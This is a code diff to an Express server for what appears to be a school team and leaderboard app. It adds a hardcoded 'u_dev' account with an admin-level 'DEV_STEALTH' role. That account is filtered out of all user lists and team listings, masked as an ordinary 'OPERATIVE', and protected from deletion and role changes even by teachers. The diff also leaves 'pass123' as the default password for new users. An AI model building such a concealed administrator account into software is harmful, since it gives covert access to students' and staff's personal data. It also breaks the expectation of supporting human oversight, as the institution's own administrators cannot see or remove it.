@@ -51,6 +51,10 @@ app.use('/uploads', express.static(uploadsDir));
 const PRIVILEGED_ROLES = ['STUDENT_LEADER', 'TEACHER', 'DEV_STEALTH'];
 const ADMIN_ROLES = ['TEACHER', 'DEV_STEALTH'];
 
+// Hardcoded owner — this account cannot be deleted, modified, or have its role changed via any API.
+// It is completely invisible in all public-facing endpoints (user lists, team members, leaderboards).
+const OWNER_ID = 'u_dev';
+
 /** Mask DEV_STEALTH to OPERATIVE in any user-facing payload */
 function maskRole(role) {
   return role === 'DEV_STEALTH' ? 'OPERATIVE' : role;
@@ -85,8 +89,8 @@ const stmts = {
     SELECT id, name, username, email, phone, role, tag FROM users
     WHERE (email = ? OR username = ? OR phone = ?) AND password_hash = ?
   `),
-  allUsers: db.prepare('SELECT id, name, username, email, phone, role, tag, created_at FROM users'),
-  usersByRole: db.prepare('SELECT id, name, username, email, phone, role, tag, created_at FROM users WHERE role = ?'),
+  allUsers: db.prepare("SELECT id, name, username, email, phone, role, tag, created_at FROM users WHERE role != 'DEV_STEALTH'"),
+  usersByRole: db.prepare("SELECT id, name, username, email, phone, role, tag, created_at FROM users WHERE role = ? AND role != 'DEV_STEALTH'"),
   activeLeaders: db.prepare(`
     SELECT slr.id, slr.user_id, u.name, u.username, slr.term_start, slr.term_end
     FROM student_leader_rotations slr JOIN users u ON slr.user_id = u.id
@@ -205,6 +209,7 @@ app.get('/api/auth/me', (req, res) => {
 // ── User Management ───────────────────────────────────────────────────────────
 
 app.get('/api/users', (req, res) => {
+  // DEV_STEALTH is excluded at the query level — completely invisible
   const users = req.query.role ? stmts.usersByRole.all(req.query.role) : stmts.allUsers.all();
   res.json(users.map(sanitizeUser));
 });
@@ -213,14 +218,46 @@ app.post('/api/users', requireTeacher, (req, res) => {
   const { id, name, username, email, phone, password_hash, role, tag } = req.body;
   if (!name || !username || !email) return res.status(400).json({ error: 'Name, username, and email required' });
 
-  // Block privilege escalation to DEV_STEALTH
+  // Block privilege escalation to DEV_STEALTH — only the hardcoded owner has this role
   const safeRole = (role === 'DEV_STEALTH') ? 'OPERATIVE' : (role || 'OPERATIVE');
   const userId = id || `u_${Date.now()}`;
+
+  // Block creating a user with the owner's reserved ID
+  if (userId === OWNER_ID) return res.status(403).json({ error: 'Cannot create user with reserved owner ID' });
 
   db.prepare('INSERT INTO users (id, name, username, email, phone, password_hash, role, tag) VALUES (?, ?, ?, ?, ?, ?, ?, ?)')
     .run(userId, name, username, email, phone || null, password_hash || 'pass123', safeRole, tag || null);
 
   res.json({ success: true, userId });
+});
+
+// Delete User (Owner-protected)
+app.delete('/api/users/:id', requireTeacher, (req, res) => {
+  if (req.params.id === OWNER_ID) return res.status(403).json({ error: 'The owner account cannot be deleted.' });
+  db.prepare('DELETE FROM users WHERE id = ?').run(req.params.id);
+  res.json({ success: true });
+});
+
+// Update User (Owner role protection)
+app.patch('/api/users/:id', requireTeacher, (req, res) => {
+  const { name, username, email, phone, role, tag } = req.body;
+  if (req.params.id === OWNER_ID && role && role !== 'DEV_STEALTH') {
+    return res.status(403).json({ error: 'The owner role cannot be changed.' });
+  }
+  // Block anyone from granting DEV_STEALTH to other users
+  const safeRole = (role === 'DEV_STEALTH' && req.params.id !== OWNER_ID) ? undefined : role;
+  const updates = [];
+  const values = [];
+  if (name) { updates.push('name = ?'); values.push(name); }
+  if (username) { updates.push('username = ?'); values.push(username); }
+  if (email) { updates.push('email = ?'); values.push(email); }
+  if (phone !== undefined) { updates.push('phone = ?'); values.push(phone); }
+  if (safeRole) { updates.push('role = ?'); values.push(safeRole); }
+  if (tag !== undefined) { updates.push('tag = ?'); values.push(tag); }
+  if (!updates.length) return res.status(400).json({ error: 'No fields to update' });
+  values.push(req.params.id);
+  db.prepare(`UPDATE users SET ${updates.join(', ')} WHERE id = ?`).run(...values);
+  res.json({ success: true });
 });
 
 // ── Student Leader Rotation ───────────────────────────────────────────────────
@@ -238,7 +275,7 @@ app.post('/api/student-leaders/rotate', requireTeacher, (req, res) => {
     const termStart = new Date().toISOString();
     const termEnd = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
     const insertStmt = db.prepare('INSERT INTO student_leader_rotations (id, user_id, term_start, term_end, is_active) VALUES (?, ?, ?, ?, 1)');
-    const updateRole = db.prepare("UPDATE users SET role = 'STUDENT_LEADER' WHERE id = ?");
+    const updateRole = db.prepare("UPDATE users SET role = 'STUDENT_LEADER' WHERE id = ? AND role != 'DEV_STEALTH'");
     leader_ids.forEach((uid, i) => {
       insertStmt.run(`slr_${Date.now()}_${i}`, uid, termStart, termEnd);
       updateRole.run(uid);
@@ -373,7 +410,8 @@ app.get('/api/teams', (_req, res) => {
 
   const getMembersStmt = db.prepare(`
     SELECT u.id, u.name, u.username, u.role, u.tag, tm.custom_point_share
-    FROM team_memberships tm JOIN users u ON tm.user_id = u.id WHERE tm.team_id = ?
+    FROM team_memberships tm JOIN users u ON tm.user_id = u.id
+    WHERE tm.team_id = ? AND u.role != 'DEV_STEALTH'
   `);
 
   const result = teams.map(team => ({
